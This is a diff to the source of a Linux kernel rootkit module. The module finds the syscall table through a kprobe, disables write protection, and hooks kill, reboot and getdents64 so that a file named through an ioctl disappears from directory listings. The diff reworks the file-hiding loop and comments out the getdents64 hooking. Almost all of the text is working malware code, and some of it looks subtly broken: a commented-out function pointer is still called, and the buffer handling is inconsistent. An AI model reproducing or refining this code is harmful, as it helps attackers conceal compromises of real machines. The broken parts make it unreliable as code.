@@ -38,7 +38,7 @@ static struct hided_file file_to_hide = {0};
 typedef asmlinkage unsigned long (*orgin_syscall)(const struct pt_regs *);
 static orgin_syscall orig_kill;
 static orgin_syscall orig_reboot;
-static orgin_syscall orig_getdents64;
+// static orgin_syscall orig_getdents64;
 
 static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name",
@@ -96,12 +96,14 @@ static asmlinkage int hook_kill(const struct pt_regs *regs)
 }
 
 // hook getdents64
-static asmlinkage int hook_getdents(const struct pt_regs *regs)
+static asmlinkage int hook_getdents64(const struct pt_regs *regs)
 {
-	struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->regs[1];
 	int ret = orig_getdents64(regs);
-	struct linux_dirent64 *current_dir, *dirent_ker, *prev = NULL;
-	unsigned long offset = 0;
+	if (ret <= 0)
+		return ret;
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->regs[1];
+	struct linux_dirent64 *current_dir, *dirent_ker = NULL, *prev = NULL;
+	unsigned long i = 0, total_len = 0;
 
 	// Allocate kernel space buffer for directory entries
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
@@ -118,27 +120,35 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs)
 	}
 
 	// Iterate over the directory entries
-	while (offset < ret)
+	while (i < ret)
 	{
-		current_dir = (void *)dirent_ker + offset;
+		current_dir = (void *)dirent_ker + i;
 
-		// If the current entry matches the file to hide, remove it from the list
-		if (strncmp(current_dir->d_name, file_to_hide.name, file_to_hide.len) == 0)
+		if (strncmp(current_dir->d_name, file_to_hide.name, strlen(file_to_hide.name)) == 0)
 		{
-			if (current_dir == dirent_ker)
+			// If the current entry matches the file to hide, remove it from the list
+			if (prev)
 			{
-				ret -= current_dir->d_reclen;
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				// Not the first entry
+				prev->d_reclen += current_dir->d_reclen;
+			}
+			else
+			{
+				// First entry
+				unsigned long len = ret - (i + current_dir->d_reclen);
+				memmove(dirent_ker, (void *)current_dir + current_dir->d_reclen, len);
+				total_len += current_dir->d_reclen; // update total_len to reflect the removed entry
+				i = 0;								// reset i to start the loop from the beginning
 				continue;
 			}
-			prev->d_reclen += current_dir->d_reclen;
 		}
 		else
 		{
 			prev = current_dir;
+			total_len += current_dir->d_reclen;
 		}
 
-		offset += current_dir->d_reclen;
+		i += current_dir->d_reclen;
 	}
 
 	// Copy the modified directory entries back to user space
@@ -149,8 +159,7 @@ static asmlinkage int hook_getdents(const struct pt_regs *regs)
 	}
 
 	kfree(dirent_ker);
-	return ret;
-	return 0;
+	return total_len;
 }
 
 static inline void protect_memory(void)
@@ -200,14 +209,14 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 		printk(KERN_INFO "getdents64: %d\n", __NR_getdents64);
 		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
 		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
-		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
+		// orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
 
 		// hook the sys call
 		unprotect_memory();
 
 		__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
 		__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
-		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents;
+		// __sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
 
 		protect_memory();
 
@@ -289,14 +298,11 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 	case IOCTL_FILE_HIDE:
 	{
 		// Copy the hided_file structure from user space
-		if (copy_from_user(&file_to_hide, (struct hided_file __user *)arg, sizeof(file_to_hide)))
+		if (copy_from_user(&file_to_hide, (struct hided_file *)arg, sizeof(file_to_hide)))
 		{
-			ret = -EFAULT;
+			return -EFAULT;
 		}
-		else
-		{
-			printk(KERN_INFO "Hiding file: %s\n", file_to_hide.name);
-		}
+		printk(KERN_INFO "File to hide: %s\n", file_to_hide.name);
 		break;
 	}
 
@@ -358,7 +364,7 @@ static void __exit rootkit_exit(void)
 
 	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
-	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+	// __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 
 	protect_memory();
 
